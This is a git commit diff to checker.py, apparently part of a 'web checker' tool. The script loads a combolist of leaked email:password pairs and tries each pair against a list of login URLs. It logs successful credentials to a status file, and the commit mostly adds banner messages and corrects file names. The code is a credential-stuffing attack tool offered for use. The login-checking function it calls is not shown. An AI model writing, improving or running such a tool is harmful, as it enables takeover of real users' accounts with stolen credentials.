3ee980ce1c31ad46afab2330228d22f6942433a6
HuckApps <jakehunt000000@gmail.com>
2019-12-12 07:50:52 -0800

    updated

--- checker.py
+++ checker.py
@@ -4,23 +4,27 @@ from modes.Checker  import check
 status=''
 count=0
 
-comboStatus = input('pls paste the combolist file in the list folder and name file as comboList  ...type OK if done: ')
-urlStatus = input('pls paste the url file in the list folder and name file as urlList ...type OK if done: ')
+print('''*****************************THIS IS HUCKS APPS- WEB CHECKER ALL************************************
+ ***************************Read instruction properly for use********************************************
+ ''')
+
+comboStatus = input('pls copy & paste d combolist in d comboList file in d list folder and  ...type OK if done: ')
+urlStatus = input('pls copy & paste d login-Url in d urlList file in d list folder and  ...type OK if done: ')
 with open('./lists/comboList.txt', 'r') as emailPass:
     combo_list = emailPass.readlines()
     for combo in combo_list:
         arg = combo.split(':')
         email = arg[0]
         password = arg[1]
-        with open('./lists/url_List.txt', 'r') as urls:
+        with open('./lists/urlList.txt', 'r') as urls:
             url_list = urls.readlines()
             for url in url_list:
                 check(url=url, email=email, password=password)
                 if status != "":
                     print(f'this is the email {email}, this is password {password}, this the url {url}')
-                    with open('./lists/status', 'a') as stat:
+                    with open('./lists/status.txt', 'a') as stat:
                         stat.write(f'log  {email}, {password}, {url}, {status}......')
-
+print('''*************************DONE!!!!!!!!!!!********Check the lists folder and status file to view results***** ''')
 
 
 
